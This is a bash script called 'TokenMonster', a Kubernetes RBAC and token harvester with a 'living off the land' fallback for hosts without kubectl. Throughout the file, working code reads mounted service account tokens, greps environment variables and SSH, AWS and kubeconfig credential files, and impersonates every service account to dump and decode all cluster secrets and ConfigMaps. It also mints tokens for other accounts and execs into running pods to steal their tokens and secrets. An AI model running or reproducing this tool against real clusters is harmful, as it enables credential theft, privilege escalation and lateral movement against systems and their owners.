#!/bin/bash
# TokenMonster - LOTL Edition
# Detects available tools and uses best available for kubectl-less operations

# =============================================================================
# TOOL DETECTION & PREFERENCE ENGINE
# =============================================================================

declare -g AVAILABLE_TOOLS=()
declare -g DOWNLOAD_TOOL=""
declare -g JSON_PARSER=""
declare -g DECODE_TOOL=""

detect_tools() {
    echo "[*] Detecting available tools for LOTL operations..."
    
    # Check for download tools (in order of preference)
    if command -v curl &> /dev/null; then
        AVAILABLE_TOOLS+=("curl")
        [ -z "$DOWNLOAD_TOOL" ] && DOWNLOAD_TOOL="curl"
    fi
    
    if command -v wget &> /dev/null; then
        AVAILABLE_TOOLS+=("wget")
        [ -z "$DOWNLOAD_TOOL" ] && DOWNLOAD_TOOL="wget"
    fi
    
    if command -v python3 &> /dev/null; then
        AVAILABLE_TOOLS+=("python3")
        [ -z "$DOWNLOAD_TOOL" ] && DOWNLOAD_TOOL="python3"
    fi
    
    if command -v perl &> /dev/null; then
        AVAILABLE_TOOLS+=("perl")
    fi
    
    # Check for JSON parsing (in order of preference)
    if command -v jq &> /dev/null; then
        JSON_PARSER="jq"
    elif command -v python3 &> /dev/null; then
        JSON_PARSER="python3"
    elif command -v perl &> /dev/null; then
        JSON_PARSER="perl"
    fi
    
    # Check for base64 decoding
    if command -v base64 &> /dev/null; then
        DECODE_TOOL="base64"
    elif command -v openssl &> /dev/null; then
        DECODE_TOOL="openssl"
    elif command -v python3 &> /dev/null; then
        DECODE_TOOL="python3"
    fi
    
    echo "[+] Available tools: ${AVAILABLE_TOOLS[*]}"
    echo "[+] Download tool: $DOWNLOAD_TOOL"
    echo "[+] JSON parser: $JSON_PARSER"
    echo "[+] Decode tool: $DECODE_TOOL"
    
    # Check if kubectl is available
    if command -v kubectl &> /dev/null; then
        echo "[+] kubectl is available - using native mode"
        return 0
    else
        echo "[!] kubectl NOT found - enabling LOTL fallback mode"
        return 1
    fi
}

# =============================================================================
# DOWNLOAD FUNCTIONS
# =============================================================================

download_file() {
    local url="$1"
    local output="$2"
    
    case "$DOWNLOAD_TOOL" in
        curl)
            curl -s -o "$output" "$url"
            ;;
        wget)
            wget -q -O "$output" "$url"
            ;;
        python3)
            python3 -c "import urllib.request; urllib.request.urlretrieve('$url', '$output')"
            ;;
        *)
            echo "[!] No suitable download tool found"
            return 1
            ;;
    esac
}

download_text() {
    local url="$1"
    
    case "$DOWNLOAD_TOOL" in
        curl)
            curl -s "$url"
            ;;
        wget)
            wget -q -O - "$url"
            ;;
        python3)
            python3 -c "import urllib.request; print(urllib.request.urlopen('$url').read().decode())"
            ;;
        *)
            echo "[!] No suitable download tool found" >&2
            return 1
            ;;
    esac
}

# =============================================================================
# JSON PARSING FUNCTIONS
# =============================================================================

parse_json() {
    local json="$1"
    local query="$2"
    
    case "$JSON_PARSER" in
        jq)
            echo "$json" | jq -r "$query"
            ;;
        python3)
            python3 -c "import json, sys; data=json.loads('''$json'''); print(json.dumps(eval('data$query')))"
            ;;
        perl)
            perl -MJSON -le "my \$d=decode_json('''$json'''); print \$d$query"
            ;;
        *)
            echo "[!] No JSON parser available" >&2
            return 1
            ;;
    esac
}

# =============================================================================
# BASE64 DECODE FUNCTIONS
# =============================================================================

decode_base64() {
    local encoded="$1"
    
    case "$DECODE_TOOL" in
        base64)
            echo "$encoded" | base64 -d 2>/dev/null
            ;;
        openssl)
            echo "$encoded" | openssl enc -d -a 2>/dev/null
            ;;
        python3)
            python3 -c "import base64; print(base64.b64decode('$encoded').decode())" 2>/dev/null
            ;;
        *)
            echo "[!] No decode tool available" >&2
            return 1
            ;;
    esac
}

# =============================================================================
# API QUERY FUNCTIONS (Kubernetes API server access)
# =============================================================================

# Query Kubernetes API directly via in-cluster metadata or API server
query_k8s_api() {
    local endpoint="$1"
    local token="$2"
    local api_server="${K8S_API_SERVER:-https://kubernetes.default.svc.cluster.local}"
    
    case "$DOWNLOAD_TOOL" in
        curl)
            curl -s -H "Authorization: Bearer $token" \
                 -H "Content-Type: application/json" \
                 --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
                 "$api_server/api/v1/$endpoint" 2>/dev/null
            ;;
        wget)
            wget -q -O - \
                 --header="Authorization: Bearer $token" \
                 --header="Content-Type: application/json" \
                 --ca-certificate=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
                 "$api_server/api/v1/$endpoint" 2>/dev/null
            ;;
        *)
            echo "[!] Cannot query K8S API without curl or wget" >&2
            return 1
            ;;
    esac
}

# =============================================================================
# LOTL TOKEN HARVESTING
# =============================================================================

harvest_tokens_lotl() {
    echo "========================================="
    echo "🔓 LOTL TOKEN HARVESTING MODE"
    echo "========================================="
    
    # Check for mounted service account token (pod runtime)
    local sa_token_path="/var/run/secrets/kubernetes.io/serviceaccount/token"
    local sa_ca_path="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
    local sa_namespace_path="/var/run/secrets/kubernetes.io/serviceaccount/namespace"
    
    if [ -f "$sa_token_path" ]; then
        echo "[+] Found mounted service account token"
        local token=$(cat "$sa_token_path" 2>/dev/null)
        local namespace=$(cat "$sa_namespace_path" 2>/dev/null)
        
        echo ""
        echo "=== MOUNTED SERVICE ACCOUNT TOKEN ==="
        echo "Namespace: $namespace"
        echo "Token: $token"
        echo ""
        
        # Try to decode JWT
        decode_jwt "$token"
        
        # Query API server for secrets using this token
        echo ""
        echo "=== ATTEMPTING API QUERIES WITH MOUNTED TOKEN ==="
        query_secrets_via_api "$token"
    fi
    
    # Check for tokens in environment variables
    echo ""
    echo "=== CHECKING ENVIRONMENT FOR TOKENS ==="
    env | grep -iE "token|password|secret|credential|auth|api.?key" | head -20
    
    # Search filesystem for common token locations
    echo ""
    echo "=== SEARCHING FILESYSTEM FOR TOKENS ==="
    find_tokens_in_filesystem
}

decode_jwt() {
    local jwt="$1"
    
    echo "[*] Attempting to decode JWT..."
    
    # Split JWT
    local header=$(echo "$jwt" | cut -d'.' -f1)
    local payload=$(echo "$jwt" | cut -d'.' -f2)
    
    echo "Header:"
    decode_base64 "$header" 2>/dev/null | head -5
    
    echo "Payload:"
    decode_base64 "$payload" 2>/dev/null | head -10
}

query_secrets_via_api() {
    local token="$1"
    local namespace="${2:-default}"
    
    echo "[*] Querying Kubernetes API for secrets in namespace: $namespace"
    
    local response=$(query_k8s_api "namespaces/$namespace/secrets" "$token")
    
    if [ -n "$response" ]; then
        echo "$response" | head -50
    else
        echo "[!] Failed to query API or no curl/wget available"
    fi
}

find_tokens_in_filesystem() {
    local paths=(
        "/root/.kube/config"
        "/root/.aws/credentials"
        "/root/.ssh/id_rsa"
        "/root/.ssh/id_ed25519"
        "/root/.aws/credentials"
        "/etc/kubernetes/admin.conf"
        "/etc/kubernetes/kubelet.conf"
        "/.dockercfg"
        "/etc/docker/config.json"
        "/app/.env"
        "/app/config.json"
        "/home/*/.kube/config"
        "/opt/*/credentials"
    )
    
    for path in "${paths[@]}"; do
        find "$path" -type f 2>/dev/null | while read -r file; do
            if [ -r "$file" ]; then
                echo "[+] Found: $file"
                head -10 "$file" 2>/dev/null
                echo ""
            fi
        done
    done
}

# =============================================================================
# KUBECTL NATIVE MODE (original functionality)
# =============================================================================

run_kubectl_mode() {
    # Get all the clusters (skip header line with NAME)
    clusters=$(kubectl config get-contexts -o name)

    # Common verbs to test
    VERBS=("get" "list" "create" "update" "patch" "delete" "deletecollection" "watch")

    # Sensitive resources related to secrets and tokens
    SENSITIVE_RESOURCES=("secrets" "serviceaccounts" "serviceaccounts/token" "pods" "pods/exec")

    for cluster in ${clusters}
    do
      echo "========================================="
      echo "Checking cluster: $cluster"
      echo "========================================="
      
      # Set the current context to the target cluster
      kubectl config use-context $cluster

      # Check for token access vulnerabilities
      echo ""
      echo "=== 🔐 SERVICE ACCOUNT TOKEN ACCESS ANALYSIS ==="
      echo ""
      
      # Get all service accounts across all namespaces
      kubectl get serviceaccounts --all-namespaces -o json | jq -r '.items[] | "\(.metadata.namespace)|\(.metadata.name)"' | while IFS='|' read -r namespace sa_name
      do
        has_sensitive_access=false
        sensitive_permissions=""
        
        # Check if this SA can read secrets
        if kubectl auth can-i get secrets --as="system:serviceaccount:$namespace:$sa_name" -n "$namespace" 2>/dev/null | grep -q "yes"; then
          has_sensitive_access=true
          sensitive_permissions="${sensitive_permissions}\n  ⚠️  Can GET secrets in namespace $namespace"
          
          # Try to actually get ALL secrets and extract ALL data
          echo "  🔑 Attempting to retrieve ALL secrets as $sa_name in namespace $namespace..."
          kubectl get secrets -n "$namespace" --as="system:serviceaccount:$namespace:$sa_name" -o json 2>/dev/null | jq -r '.items[] | 
            "    ═══════════════════════════════════════════════════════\n" +
            "    Secret Name: \(.metadata.name)\n" +
            "    Type: \(.type)\n" +
            "    Namespace: \(.metadata.namespace)\n" +
            "    Created: \(.metadata.creationTimestamp)\n" +
            "    Data Keys: \(.data | keys | join(", "))\n" +
            "    ───────────────────────────────────────────────────────\n" +
            (.data | to_entries[] | 
              "    📝 \(.key):\n       \(.value | @base64d)\n"
            ) +
            "    ═══════════════════════════════════════════════════════\n"
          ' 2>/dev/null
        fi
        
        if kubectl auth can-i list secrets --as="system:serviceaccount:$namespace:$sa_name" -n "$namespace" 2>/dev/null | grep -q "yes"; then
          has_sensitive_access=true
          sensitive_permissions="${sensitive_permissions}\n  ⚠️  Can LIST secrets in namespace $namespace"
        fi
        
        # Check if this SA can read secrets across all namespaces
        if kubectl auth can-i get secrets --as="system:serviceaccount:$namespace:$sa_name" --all-namespaces 2>/dev/null | grep -q "yes"; then
          has_sensitive_access=true
          sensitive_permissions="${sensitive_permissions}\n  🚨 Can GET secrets across ALL namespaces"
          
          # Try to get ALL secrets from ALL namespaces
          echo "  🔑 Attempting to retrieve ALL secrets from ALL namespaces as $sa_name..."
          kubectl get secrets --all-namespaces --as="system:serviceaccount:$namespace:$sa_name" -o json 2>/dev/null | jq -r '.items[] | 
            "    ═══════════════════════════════════════════════════════\n" +
            "    Secret Name: \(.metadata.name)\n" +
            "    Type: \(.type)\n" +
            "    Namespace: \(.metadata.namespace)\n" +
            "    Created: \(.metadata.creationTimestamp)\n" +
            "    Data Keys: \(.data | keys | join(", "))\n" +
            "    ───────────────────────────────────────────────────────\n" +
            (.data | to_entries[] | 
              "    📝 \(.key):\n       \(.value | @base64d)\n"
            ) +
            "    ═══════════════════════════════════════════════════════\n"
          ' 2>/dev/null
        fi
        
        if kubectl auth can-i list secrets --as="system:serviceaccount:$namespace:$sa_name" --all-namespaces 2>/dev/null | grep -q "yes"; then
          has_sensitive_access=true
          sensitive_permissions="${sensitive_permissions}\n  🚨 Can LIST secrets across ALL namespaces"
        fi
        
        # Check if this SA can read ConfigMaps (may contain passwords/credentials)
        if kubectl auth can-i get configmaps --as="system:serviceaccount:$namespace:$sa_name" -n "$namespace" 2>/dev/null | grep -q "yes"; then
          has_sensitive_access=true
          sensitive_permissions="${sensitive_permissions}\n  ⚠️  Can GET configmaps in namespace $namespace"
          
          # Try to get configmaps and look for sensitive data
          echo "  📋 Attempting to retrieve ConfigMaps as $sa_name in namespace $namespace..."
          kubectl get configmaps -n "$namespace" --as="system:serviceaccount:$namespace:$sa_name" -o json 2>/dev/null | jq -r '.items[] | 
            select(.data | to_entries[] | .key | test("password|secret|token|key|credential|auth|api.?key|db|database"; "i")) |
            "    ═══════════════════════════════════════════════════════\n" +
            "    ConfigMap Name: \(.metadata.name)\n" +
            "    Namespace: \(.metadata.namespace)\n" +
            "    ───────────────────────────────────────────────────────\n" +
            (.data | to_entries[] | 
              if (.key | test("password|secret|token|key|credential|auth|api.?key|db|database"; "i")) then
                "    🔓 \(.key):\n       \(.value)\n"
              else
                ""
              end
            ) +
            "    ═══════════════════════════════════════════════════════\n"
          ' 2>/dev/null
        fi
        
        # Check if this SA can read service account tokens
        if kubectl auth can-i get serviceaccounts/token --as="system:serviceaccount:$namespace:$sa_name" -n "$namespace" 2>/dev/null | grep -q "yes"; then
          has_sensitive_access=true
          sensitive_permissions="${sensitive_permissions}\n  ⚠️  Can GET serviceaccount tokens in namespace $namespace"
        fi
        
        if kubectl auth can-i create serviceaccounts/token --as="system:serviceaccount:$namespace:$sa_name" -n "$namespace" 2>/dev/null | grep -q "yes"; then
          has_sensitive_access=true
          sensitive_permissions="${sensitive_permissions}\n  ⚠️  Can CREATE serviceaccount tokens in namespace $namespace"
          
          # Try to create a token for other service accounts in the namespace
          echo "  🔑 Attempting to create tokens for service accounts in namespace $namespace..."
          kubectl get serviceaccounts -n "$namespace" -o json 2>/dev/null | jq -r '.items[].metadata.name' | while read -r target_sa
          do
            token_response=$(kubectl create token "$target_sa" -n "$namespace" --as="system:serviceaccount:$namespace:$sa_name" --duration=1h 2>/dev/null)
            if [ -n "$token_response" ]; then
              echo "    ══════════════��════════════════════════════════════════"
              echo "    ✓ Created token for ServiceAccount: $target_sa"
              echo "    Namespace: $namespace"
              echo "    Token (JWT):"
              echo "       $token_response"
              echo "    Expires: 1 hour from now"
              # Decode JWT header and payload
              echo "    Decoded Header:"
              echo "       $(echo $token_response | cut -d'.' -f1 | base64 -d 2>/dev/null | jq . 2>/dev/null || echo 'Unable to decode')"
              echo "    Decoded Payload:"
              echo "       $(echo $token_response | cut -d'.' -f2 | base64 -d 2>/dev/null | jq . 2>/dev/null || echo 'Unable to decode')"
              echo "    ═══════════════════════════════════════════════════════"
              echo ""
            fi
          done
        fi
        
        # Check if this SA can read other service accounts
        if kubectl auth can-i get serviceaccounts --as="system:serviceaccount:$namespace:$sa_name" -n "$namespace" 2>/dev/null | grep -q "yes"; then
          has_sensitive_access=true
          sensitive_permissions="${sensitive_permissions}\n  ⚠️  Can GET serviceaccounts in namespace $namespace"
        fi
        
        # Check if this SA can exec into pods (could read mounted tokens)
        if kubectl auth can-i create pods/exec --as="system:serviceaccount:$namespace:$sa_name" -n "$namespace" 2>/dev/null | grep -q "yes"; then
          has_sensitive_access=true
          sensitive_permissions="${sensitive_permissions}\n  🚨 Can EXEC into pods in namespace $namespace (can read mounted tokens)"
          
          # Try to read tokens and env vars from running pods
          echo "  🔑 Attempting to read tokens and environment variables from pods in namespace $namespace..."
          kubectl get pods -n "$namespace" --as="system:serviceaccount:$namespace:$sa_name" -o json 2>/dev/null | jq -r '.items[] | select(.status.phase == "Running") | .metadata.name' | while read -r pod_name
          do
            echo "    ═══════════════════════════════════════════════════════"
            echo "    ✓ Accessing pod: $pod_name"
            
            # Get mounted token
            token=$(kubectl exec -n "$namespace" "$pod_name" --as="system:serviceaccount:$namespace:$sa_name" -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
            if [ -n "$token" ]; then
              echo "    ServiceAccount Token:"
              echo "       $token"
              
              sa_namespace=$(kubectl exec -n "$namespace" "$pod_name" --as="system:serviceaccount:$namespace:$sa_name" -- cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
              echo "    Token Namespace: $sa_namespace"
            fi
            
            # Get environment variables (may contain secrets)
            echo "    Environment Variables (checking for secrets):"
            kubectl exec -n "$namespace" "$pod_name" --as="system:serviceaccount:$namespace:$sa_name" -- env 2>/dev/null | grep -iE "password|secret|token|key|credential|auth|api.?key|db|database" | while read -r env_line
            do
              echo "       🔓 $env_line"
            done
            
            # Check for common credential files
            echo "    Checking for credential files:"
            for file in /root/.ssh/id_rsa /root/.ssh/id_ed25519 /root/.aws/credentials /root/.kube/config /etc/secret /app/.env /app/config.json
            do
              content=$(kubectl exec -n "$namespace" "$pod_name" --as="system:serviceaccount:$namespace:$sa_name" -- cat "$file" 2>/dev/null)
              if [ -n "$content" ]; then
                echo "       📁 Found: $file"
                echo "$content" | head -20
              fi
            done
            
            echo "    ═══════════════════════════════════════════════════════"
            echo ""
          done
        fi
        
        # Check if this SA can read pods (to see volume mounts)
        if kubectl auth can-i get pods --as="system:serviceaccount:$namespace:$sa_name" -n "$namespace" 2>/dev/null | grep -q "yes"; then
          has_sensitive_access=true
          sensitive_permissions="${sensitive_permissions}\n  ℹ️  Can GET pods in namespace $namespace (can see token mounts)"
        fi
        
        # Only print if there are sensitive permissions
        if [ "$has_sensitive_access" = true ]; then
          echo "--- ServiceAccount: $sa_name (namespace: $namespace) ---"
          echo -e "$sensitive_permissions"
          echo ""
        fi
      done

      # Get all service accounts across all namespaces
      echo ""
      echo "=== Service Accounts and Their Permissions ==="
      kubectl get serviceaccounts --all-namespaces -o json | jq -r '.items[] | "\(.metadata.namespace)|\(.metadata.name)"' | while IFS='|' read -r namespace sa_name
      do
        # Skip default service accounts unless they have interesting bindings
        if [[ "$sa_name" == "default" ]]; then
          continue
        fi
        
        echo ""
        echo "--- ServiceAccount: $sa_name (namespace: $namespace) ---"
        
        # Get API resources and test permissions
        kubectl api-resources --verbs=list --namespaced -o name | while read -r resource
        do
          # Test each verb for this resource
          allowed_verbs=()
          for verb in "${VERBS[@]}"
          do
            if kubectl auth can-i "$verb" "$resource" --as="system:serviceaccount:$namespace:$sa_name" -n "$namespace" 2>/dev/null | grep -q "yes"; then
              allowed_verbs+=("$verb")
            fi
          done
          
          # Only print if there are allowed verbs
          if [ ${#allowed_verbs[@]} -gt 0 ]; then
            echo "  ✓ $resource: ${allowed_verbs[*]}"
          fi
        done
        
        # Test cluster-scoped resources
        kubectl api-resources --verbs=list --namespaced=false -o name | while read -r resource
        do
          allowed_verbs=()
          for verb in "${VERBS[@]}"
          do
            if kubectl auth can-i "$verb" "$resource" --as="system:serviceaccount:$namespace:$sa_name" 2>/dev/null | grep -q "yes"; then
              allowed_verbs+=("$verb")
            fi
          done
          
          if [ ${#allowed_verbs[@]} -gt 0 ]; then
            echo "  ✓ $resource (cluster-scoped): ${allowed_verbs[*]}"
          fi
        done
      done

      # Get all RoleBindings with namespace and name
      echo ""
      echo "=== RoleBindings Summary ==="
      kubectl get rolebinding --all-namespaces -o json | jq -r '.items[] | select(.subjects[]? | select(.kind == "ServiceAccount")) | "\(.metadata.namespace)|\(.metadata.name)|\(.roleRef.name)|\(.subjects[] | select(.kind == "ServiceAccount") | .name)"' | while IFS='|' read -r namespace binding role subject
      do
        echo "  $subject (ns: $namespace) -> Role: $role via RoleBinding: $binding"
      done

      # Get all ClusterRoleBindings
      echo ""
      echo "=== ClusterRoleBindings Summary ==="
      kubectl get clusterrolebinding -o json | jq -r '.items[] | select(.subjects[]? | select(.kind == "ServiceAccount")) | "\(.metadata.name)|\(.roleRef.name)|\(.subjects[] | select(.kind == "ServiceAccount") | .name)"' | while IFS='|' read -r binding role subject
      do
        echo "  $subject -> ClusterRole: $role via ClusterRoleBinding: $binding"
      done
      
      echo ""
    done
}

# =============================================================================
# MAIN EXECUTION
# =============================================================================

main() {
    echo ""
    echo "╔════════════════════════════════════════════════════════════════╗"
    echo "║          🧌 TokenMonster - RBAC & Token Harvester 🧌          ║"
    echo "║                    LOTL Edition with Tool Detection             ║"
    echo "╚════════════════════════════════════════════════════════════════╝"
    echo ""
    
    # Detect available tools
    detect_tools
    
    if [ $? -eq 0 ]; then
        # kubectl is available - run native mode
        run_kubectl_mode
    else
        # kubectl not available - run LOTL mode
        harvest_tokens_lotl
    fi
}

# Execute main function
main "$@"
